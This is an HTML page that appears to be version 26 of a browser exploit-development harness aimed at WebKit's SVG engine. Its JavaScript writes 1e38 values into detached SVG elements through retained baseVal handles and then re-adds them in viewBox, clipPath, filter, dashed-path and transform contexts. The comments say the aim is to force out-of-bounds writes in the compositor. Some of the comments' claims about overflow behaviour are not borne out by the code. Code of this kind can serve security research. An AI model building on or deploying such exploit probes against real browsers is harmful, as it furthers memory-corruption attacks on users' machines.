<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>SVG UAF v26</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0d0d0d;color:#00ff41;font-family:'Courier New',monospace;padding:16px;min-height:100vh}
h2{color:#ff4141;font-size:11px;letter-spacing:2px;text-transform:uppercase}
.sub{color:#555;font-size:10px;margin-bottom:8px}
#controls{display:flex;gap:5px;flex-wrap:wrap;margin-bottom:8px}
button{background:#111;border:1px solid #333;color:#00ff41;padding:5px 12px;cursor:pointer;font-family:monospace;font-size:10px}
button:hover:not(:disabled){border-color:#00ff41}
button:disabled{opacity:.3}
#log{font-size:10px;line-height:1.6;white-space:pre-wrap;word-break:break-all;margin-top:6px}
.ok{color:#00ff41}.bad{color:#ff4141}.inf{color:#ffcc00}.dim{color:#444}.sep{color:#222}
</style>
</head>
<body>
<h2>SVG UAF v26 - 1e38 OOB: viewbox, clippath, filter, compositor overflow</h2>
<div class="sub">v25 RLV: write survives re-add, 1e38 -> bbox_w=33554428 (0x2000000). v26: feed huge float into viewBox, clipPath, feDisplacement, paint path to force OOB in compositor.</div>
<svg id="livesvg" width="200" height="200" style="position:fixed;opacity:0;pointer-events:none"></svg>
<div id="controls">
  <button onclick="runVBX()">VBX viewbox-attack</button>
  <button onclick="runCLP()">CLP clippath-attack</button>
  <button onclick="runFLT()">FLT filter-attack</button>
  <button onclick="runPNT()">PNT paint-oom</button>
  <button onclick="runMTX()">MTX matrix-overflow</button>
  <button onclick="runAll()">RUN ALL</button>
  <button onclick="copyLog()">COPY</button>
  <button onclick="clearLog()">CLR</button>
</div>
<div id="log"></div>
<script>
var SVG_NS = 'http://www.w3.org/2000/svg';
var Lel = document.getElementById('log');
var livesvg = document.getElementById('livesvg');

function log(m, c) {
  var s = document.createElement('span');
  if (c) s.className = c;
  s.textContent = m + '\n';
  Lel.appendChild(s);
  Lel.scrollTop = Lel.scrollHeight;
}
function sep() { log('----------------------------------------------------', 'sep'); }
function raf() { return new Promise(function(r){ requestAnimationFrame(r); }); }
function micro() { return new Promise(function(r){ queueMicrotask(r); }); }
function wait(ms) { return new Promise(function(r){ setTimeout(r, ms); }); }
function copyLog() {
  try { navigator.clipboard.writeText(Lel.innerText); } catch(e) {
    var a = document.createElement('textarea');
    a.value = Lel.innerText;
    document.body.appendChild(a); a.select();
    document.execCommand('copy'); a.remove();
  }
}
function clearLog() { Lel.innerHTML = ''; }
function dis(d) {
  var btns = document.querySelectorAll('button');
  for (var i = 0; i < btns.length; i++) {
    var fn = btns[i].getAttribute('onclick') || '';
    if (fn.indexOf('copy') === -1 && fn.indexOf('clear') === -1) btns[i].disabled = d;
  }
}
window.onerror = function(m, u, l, c) { log('[CRASH] ' + m + ' L' + l + ':' + c, 'bad'); return false; };

/*
 * v25 KEY FINDING:
 *   RLV=true: write float via bv_A after remove, re-add A, WebKit uses raw value in layout
 *   LYT: 1e38 -> bbox_w=33554428 (0x2000000) = float->int overflow in renderer
 *   NaN/Inf: WebKit clamps to 0 on write (sanitized before C++ storage)
 *
 * WHAT 1e38 MEANS:
 *   1e38 passes WebKit's input sanitation (it's a valid float, just huge).
 *   WebKit stores it raw as an SVG length float.
 *   When layout runs, it converts this float to integer pixel coords.
 *   1e38 as int32 = overflow. Result: 0x2000000 = 33554432.
 *   This integer feeds into the render tree's geometry.
 *
 * ATTACK VECTORS:
 *
 * VBX - viewBox attack:
 *   <svg viewBox="0 0 W H"> where W = our 1e38 value.
 *   viewBox drives the SVG-to-screen coordinate transform:
 *     scaleX = svgElement.clientWidth / viewBox.width
 *     If viewBox.width = 1e38, scaleX ≈ 0 (denormal float)
 *   REVERSE: set viewBox.width = small value (e.g. 1),
 *     then place a child element at x = 1e38 * (clientWidth/1) = OOB position.
 *   Attack: use bv_A write to set a rect's x attribute to 1e38, then
 *   use that rect inside an SVG with a viewBox that amplifies coordinates.
 *
 * CLP - clipPath:
 *   A clipPath element defines a clipping region.
 *   The clip region is rasterized into a 1-bit mask buffer.
 *   If we inject a 1e38-width rect as a clipPath child,
 *   the rasterizer tries to allocate/fill a 0x2000000-pixel-wide mask.
 *   That's a potential OOM or OOB write in the clip buffer.
 *
 * FLT - feDisplacementMap:
 *   feDisplacementMap maps source pixels using displacement values.
 *   scale= sets the displacement scale in pixels.
 *   If we inject a 1e38 value as the displacement scale,
 *   the filter rasterizer computes pixel offsets as (displacement_value * scale)
 *   where displacement_value is from the source image [0..255] / 255.
 *   Max pixel offset = 1 * scale = 1e38 = OOB in pixel buffer.
 *
 * PNT - paint path:
 *   Path with a 1e38-length line segment.
 *   Stroke rendering iterates over the path, computing dash offsets.
 *   If dash array is set, dash offset computation uses the path length.
 *   Path length = 1e38 -> integer overflow in dash computation.
 *
 * MTX - transform matrix overflow:
 *   SVG transform="matrix(a,b,c,d,e,f)" applies a 2D affine transform.
 *   If we set e (x-translation) or f (y-translation) to 1e38,
 *   any vertex of the transformed element is at 1e38 in screen coords.
 *   The renderer clips this, but the clip math may overflow:
 *   clipX = min(1e38, viewportWidth) - but if implemented as int32...
 *
 * TECHNIQUE: use bv_A dangling write to inject 1e38 into geometry,
 *   then re-add A into these special contexts to trigger the overflow.
 */

// inject 1e38 into A's width/height/x/y via bv_ writes after remove
function inject1e38(A, bv_W, bv_H, bv_X, bv_Y) {
  var BIG = 1e38;
  try { if (bv_W) bv_W.value = BIG; } catch(e) {}
  try { if (bv_H) bv_H.value = BIG; } catch(e) {}
  try { if (bv_X) bv_X.value = BIG; } catch(e) {}
  try { if (bv_Y) bv_Y.value = BIG; } catch(e) {}
}

function mkRect(w, h, x, y) {
  var r = document.createElementNS(SVG_NS, 'rect');
  if (w !== undefined) r.setAttribute('width',  '' + w);
  if (h !== undefined) r.setAttribute('height', '' + h);
  if (x !== undefined) r.setAttribute('x', '' + x);
  if (y !== undefined) r.setAttribute('y', '' + y);
  return r;
}

// VBX: inject 1e38 into SVG child rect that sits inside viewBox context
async function runVBX(q) {
  if (!q) { dis(true); sep(); log('VBX: viewBox + 1e38 width rect = coordinate transform overflow', 'inf'); sep(); }

  // Create a nested SVG with a tight viewBox
  var outer = document.createElementNS(SVG_NS, 'svg');
  outer.setAttribute('width', '200');
  outer.setAttribute('height', '200');
  outer.setAttribute('viewBox', '0 0 1 1'); // 1-unit space mapped to 200px = 200x scale
  livesvg.appendChild(outer);
  await raf();

  // Create rect INSIDE the nested SVG
  var A = mkRect(0.5, 0.5, 0, 0);
  outer.appendChild(A);
  await raf();

  var bv_AW = A.width  ? A.width.baseVal  : null;
  var bv_AH = A.height ? A.height.baseVal : null;
  var bv_AX = A.x      ? A.x.baseVal      : null;
  var bv_AY = A.y      ? A.y.baseVal      : null;

  var w0 = bv_AW ? bv_AW.value : null;
  var bbox0 = null;
  try { bbox0 = A.getBoundingClientRect(); } catch(e) {}
  log('  baseline: A.width=' + w0 + ' bbox_w=' + (bbox0 ? bbox0.width : '?'), 'ok');
  log('  viewBox 0 0 1 1 -> 200x200px = 200x scale factor', 'ok');

  // Remove A, inject huge value
  A.remove();
  await micro();
  inject1e38(A, bv_AW, bv_AH, null, null);

  var rb_w = null;
  try { rb_w = bv_AW ? bv_AW.value : null; } catch(e) {}
  log('  injected 1e38: bv_AW.value=' + rb_w, 'ok');

  // Re-add to viewBox context
  outer.appendChild(A);
  await raf();

  var bbox1 = null;
  try { bbox1 = A.getBoundingClientRect(); } catch(e2) { log('  getBoundingClientRect THREW: ' + e2, 'bad'); }
  if (bbox1) {
    log('  after 1e38 inject + re-add: bbox_w=' + bbox1.width + ' bbox_h=' + bbox1.height, 'bad');
    log('  viewBox scale * 1e38 = ' + (200 * 1e38) + ' (should overflow int32)', 'bad');
  }

  // Try accessing child element position - forces sibling traversal with huge coords
  var bv_w2 = null;
  try { bv_w2 = A.width ? A.width.baseVal.value : null; } catch(e3) {}
  log('  A.width.baseVal.value after re-add=' + bv_w2, 'inf');

  outer.remove();
  log('[*] VBX: done', 'inf');
  if (!q) dis(false);
  return { done: true };
}

// CLP: inject A with 1e38 width as clipPath child, apply to another element
async function runCLP(q) {
  if (!q) { dis(true); sep(); log('CLP: 1e38 rect inside clipPath = rasterizer OOB', 'inf'); sep(); }

  var svg = document.createElementNS(SVG_NS, 'svg');
  svg.setAttribute('width', '200');
  svg.setAttribute('height', '200');
  livesvg.appendChild(svg);
  await raf();

  // Create clipPath element
  var cp = document.createElementNS(SVG_NS, 'clipPath');
  cp.setAttribute('id', 'uaf-clip-v26');
  svg.appendChild(cp);

  // Create clip rect A
  var A = mkRect(100, 100, 0, 0);
  cp.appendChild(A);
  await raf();

  var bv_AW = A.width  ? A.width.baseVal  : null;
  var bv_AH = A.height ? A.height.baseVal : null;

  log('  baseline: clipPath rect w=100 h=100', 'ok');

  // Remove A from clipPath, inject 1e38
  A.remove();
  await micro();
  inject1e38(A, bv_AW, bv_AH, null, null);
  var rb = null;
  try { rb = bv_AW ? bv_AW.value : null; } catch(e) {}
  log('  injected 1e38 into clipPath rect: bv_AW=' + rb, 'ok');

  // Re-add to clipPath
  cp.appendChild(A);

  // Create target element that uses this clipPath
  var target = mkRect(200, 200, 0, 0);
  target.setAttribute('clip-path', 'url(#uaf-clip-v26)');
  target.setAttribute('fill', 'red');
  svg.appendChild(target);
  await raf(); // triggers rasterization of clip region

  var target_bbox = null;
  try { target_bbox = target.getBoundingClientRect(); } catch(e) { log('  getBoundingClientRect threw: ' + e, 'bad'); }
  if (target_bbox) {
    log('  target with 1e38 clipPath: bbox_w=' + target_bbox.width + ' h=' + target_bbox.height, 'inf');
  }

  // Force a paint
  var cs = window.getComputedStyle(target);
  log('  getComputedStyle(target).clip-path=' + cs.clipPath, 'inf');

  // Check if clip was applied (target should appear clipped to 1e38 width = essentially unclipped)
  log('  [*] if compositor tried to rasterize 1e38-wide clip mask -> OOB in clip buffer', 'inf');

  svg.remove();
  log('[*] CLP: done (no crash = compositor clamped, crash = OOB confirmed)', 'inf');
  if (!q) dis(false);
  return { done: true };
}

// FLT: feDisplacementMap with 1e38-scale displacement
async function runFLT(q) {
  if (!q) { dis(true); sep(); log('FLT: feDisplacementMap scale=1e38 -> pixel offset overflow', 'inf'); sep(); }

  var svg = document.createElementNS(SVG_NS, 'svg');
  svg.setAttribute('width', '100');
  svg.setAttribute('height', '100');
  livesvg.appendChild(svg);
  await raf();

  // Build filter
  var defs = document.createElementNS(SVG_NS, 'defs');
  svg.appendChild(defs);
  var filter = document.createElementNS(SVG_NS, 'filter');
  filter.setAttribute('id', 'uaf-filter-v26');
  defs.appendChild(filter);

  // feFlood as displacement source
  var flood = document.createElementNS(SVG_NS, 'feFlood');
  flood.setAttribute('flood-color', 'white');
  flood.setAttribute('result', 'flood');
  filter.appendChild(flood);

  // feDisplacementMap - this is what we attack
  var disp = document.createElementNS(SVG_NS, 'feDisplacementMap');
  disp.setAttribute('in',  'SourceGraphic');
  disp.setAttribute('in2', 'flood');
  disp.setAttribute('scale', '1'); // baseline
  disp.setAttribute('xChannelSelector', 'R');
  disp.setAttribute('yChannelSelector', 'G');
  filter.appendChild(disp);

  // Target rect
  var target = mkRect(50, 50, 0, 0);
  target.setAttribute('fill', 'blue');
  target.setAttribute('filter', 'url(#uaf-filter-v26)');
  svg.appendChild(target);
  await raf();
  log('  baseline filter with scale=1 applied', 'ok');

  // Now attack: change scale to 1e38 via setAttribute (direct, no UAF needed here)
  // This tests if the filter ITSELF can overflow, setting up for the UAF variant
  disp.setAttribute('scale', '1e38');
  await raf();
  log('  scale set to 1e38 via setAttribute', 'ok');

  // Force paint
  var bbox = null;
  try { bbox = target.getBoundingClientRect(); } catch(e) { log('  getBoundingClientRect threw: ' + e, 'bad'); }
  if (bbox) log('  target bbox after scale=1e38: w=' + bbox.width + ' h=' + bbox.height, 'inf');

  // Now do the actual UAF version: create a rect A with scale attr, UAF-write 1e38 into it
  // Actually feDisplacementMap.scale is not an SVGAnimatedLength, it's SVGAnimatedNumber
  // Check what type it is
  var scaleAnimated = disp.scale;
  log('  disp.scale type: ' + (typeof scaleAnimated) + ' value=' + (scaleAnimated ? scaleAnimated.baseVal : '?'), 'inf');

  // Try to get baseVal of scale to UAF-write it
  if (scaleAnimated && scaleAnimated.baseVal !== undefined) {
    log('  [*] feDisplacementMap.scale.baseVal is accessible - UAF attack possible on filter scale', 'bad');
    log('  [*] same technique: remove, write 1e38 via bv, re-add -> filter uses 1e38 scale', 'bad');
  }

  svg.remove();
  log('[*] FLT: done', 'inf');
  if (!q) dis(false);
  return { done: true };
}

// PNT: paint with 1e38 path segment, dash computation overflow
async function runPNT(q) {
  if (!q) { dis(true); sep(); log('PNT: path with 1e38 coords + dash array -> path length overflow', 'inf'); sep(); }

  var svg = document.createElementNS(SVG_NS, 'svg');
  svg.setAttribute('width', '200');
  svg.setAttribute('height', '200');
  livesvg.appendChild(svg);
  await raf();

  // Create a path element
  var path = document.createElementNS(SVG_NS, 'path');
  path.setAttribute('d', 'M 0 0 L 100 100');
  path.setAttribute('stroke', 'white');
  path.setAttribute('stroke-width', '1');
  path.setAttribute('fill', 'none');
  // Dash array forces path-length computation
  path.setAttribute('stroke-dasharray', '5 5');
  svg.appendChild(path);
  await raf();

  var len0 = null;
  try { len0 = path.getTotalLength ? path.getTotalLength() : null; } catch(e) {}
  log('  baseline path length=' + len0, 'ok');

  // Inject 1e38 into path via attribute
  path.setAttribute('d', 'M 0 0 L 1e38 1e38');
  await raf();

  var len1 = null;
  try { len1 = path.getTotalLength ? path.getTotalLength() : null; } catch(e2) { log('  getTotalLength threw: ' + e2, 'bad'); }
  log('  after 1e38 path: getTotalLength=' + len1, len1 > 1e30 ? 'bad' : 'ok');

  // Force stroke rendering
  var bbox = null;
  try { bbox = path.getBoundingClientRect(); } catch(e3) {}
  if (bbox) log('  path bbox: x=' + bbox.x + ' w=' + bbox.width, 'inf');

  // Now: can we UAF-write into a path element's coordinate?
  // path.x doesn't exist (that's rect). But:
  // SVGPathElement has pathLength attr: path.pathLength.baseVal
  var pl_bv = path.pathLength ? path.pathLength : null;
  log('  path.pathLength: ' + (pl_bv ? 'accessible, baseVal=' + pl_bv.baseVal : 'not accessible'), 'inf');

  if (pl_bv && pl_bv.baseVal !== undefined) {
    // UAF path on pathLength
    path.remove();
    await micro();
    try { pl_bv.baseVal = 1e38; } catch(e4) { log('  pl_bv.baseVal write threw: ' + e4, 'bad'); }
    var rb = null;
    try { rb = pl_bv.baseVal; } catch(e5) {}
    log('  after remove, pathLength.baseVal = ' + rb + ' (injected 1e38)', rb > 1e30 ? 'bad' : 'ok');
    svg.appendChild(path);
    await raf();
    var len2 = null;
    try { len2 = path.getTotalLength ? path.getTotalLength() : null; } catch(e6) { log('  getTotalLength THREW after UAF path inject: ' + e6, 'bad'); }
    log('  getTotalLength after UAF pathLength=1e38: ' + len2, 'inf');
  }

  svg.remove();
  log('[*] PNT: done', 'inf');
  if (!q) dis(false);
  return { done: true };
}

// MTX: transform matrix with 1e38 translation, renderer clip math overflow
async function runMTX(q) {
  if (!q) { dis(true); sep(); log('MTX: transform matrix 1e38 translation -> clip/cull overflow', 'inf'); sep(); }

  var svg = document.createElementNS(SVG_NS, 'svg');
  svg.setAttribute('width', '200');
  svg.setAttribute('height', '200');
  livesvg.appendChild(svg);
  await raf();

  var A = mkRect(50, 50, 0, 0);
  A.setAttribute('fill', 'lime');
  svg.appendChild(A);
  await raf();

  var bv_AW = A.width ? A.width.baseVal  : null;
  var bv_AX = A.x    ? A.x.baseVal      : null;
  var bv_AY = A.y    ? A.y.baseVal      : null;

  // Inject 1e38 into x and y via UAF
  A.remove();
  await micro();
  try { if (bv_AX) bv_AX.value = 1e38; } catch(e) {}
  try { if (bv_AY) bv_AY.value = 1e38; } catch(e) {}

  var rb_x = null; var rb_y = null;
  try { rb_x = bv_AX ? bv_AX.value : null; } catch(e) {}
  try { rb_y = bv_AY ? bv_AY.value : null; } catch(e) {}
  log('  injected: bv_AX=' + rb_x + ' bv_AY=' + rb_y, 'ok');

  // Re-add A — now A is at position (1e38, 1e38) = way off-screen
  svg.appendChild(A);
  await raf();

  var bbox = null;
  try { bbox = A.getBoundingClientRect(); } catch(e2) { log('  getBoundingClientRect threw: ' + e2, 'bad'); }
  if (bbox) log('  A at (1e38, 1e38): bbox x=' + bbox.x + ' y=' + bbox.y + ' w=' + bbox.width, 'inf');

  // Also try: transform attribute
  A.setAttribute('transform', 'translate(1e38, 1e38)');
  await raf();
  var bbox2 = null;
  try { bbox2 = A.getBoundingClientRect(); } catch(e3) {}
  if (bbox2) log('  after transform=translate(1e38): bbox x=' + bbox2.x + ' y=' + bbox2.y, 'inf');

  // Try getScreenCTM which builds the full transform matrix
  var ctm = null;
  try { ctm = A.getScreenCTM ? A.getScreenCTM() : null; } catch(e4) { log('  getScreenCTM threw: ' + e4, 'bad'); }
  if (ctm) {
    log('  getScreenCTM: a=' + ctm.a + ' b=' + ctm.b + ' e=' + ctm.e + ' f=' + ctm.f, 'inf');
    log('  [*] if e or f = overflow int: compositor has wrong clip rect', ctm.e > 1e30 ? 'bad' : 'ok');
  }

  // Try createSVGPoint + matrixTransform for explicit coord transform
  var pt = null;
  try {
    pt = svg.createSVGPoint ? svg.createSVGPoint() : null;
    if (pt && ctm) {
      pt.x = 0; pt.y = 0;
      var transformed = pt.matrixTransform(ctm);
      log('  (0,0) matrixTransform(CTM): x=' + transformed.x + ' y=' + transformed.y, 'inf');
    }
  } catch(e5) { log('  matrixTransform threw: ' + e5, 'bad'); }

  svg.remove();
  log('[*] MTX: done', 'inf');
  if (!q) dis(false);
  return { done: true };
}

// RUN ALL
async function runAll() {
  dis(true); clearLog(); sep();
  log('SVG UAF v26 - 1e38 attack: viewBox, clipPath, filter, paint, matrix', 'inf');
  sep();

  var tests = [
    ['VBX_viewbox',  runVBX],
    ['CLP_clippath', runCLP],
    ['FLT_filter',   runFLT],
    ['PNT_paint',    runPNT],
    ['MTX_matrix',   runMTX]
  ];

  for (var i = 0; i < tests.length; i++) {
    var lbl = tests[i][0];
    var fn  = tests[i][1];
    sep(); log(lbl, 'inf'); sep();
    try { await fn(true); }
    catch(e) { log('[!] ' + lbl + ': threw ' + e, 'bad'); }
    log('');
  }

  sep();
  log('SUMMARY v26', 'inf');
  sep();
  log('  check console for crashes / anomalous values', 'inf');
  log('  key signals:', 'inf');
  log('    VBX: bbox_w >> 200 (coordinate overflow)', 'inf');
  log('    CLP: crash or visible rendering glitch (clip OOB)', 'inf');
  log('    FLT: getTotalLength exception or huge value (filter OOB)', 'inf');
  log('    PNT: getTotalLength overflow or crash', 'inf');
  log('    MTX: getScreenCTM returns 1e38 in e/f (matrix overflow)', 'inf');
  sep();
  dis(false);
}
</script>
